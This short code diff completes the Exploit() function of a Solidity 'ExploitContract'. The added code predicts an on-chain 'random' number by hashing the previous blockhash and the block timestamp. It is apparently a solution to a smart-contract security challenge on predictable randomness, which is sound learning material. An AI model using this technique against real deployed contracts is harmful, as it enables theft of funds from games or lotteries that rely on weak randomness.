@@ -38,7 +38,16 @@ contract ExploitContract {
     uint8 public answer;
 
     function Exploit() public returns (uint8) {
-        
+        answer = uint8(
+            uint256(
+                keccak256(
+                    abi.encodePacked(
+                        blockhash(block.number - 1),
+                        block.timestamp
+                    )
+                )
+            )
+        );
         return answer;
     }
 }
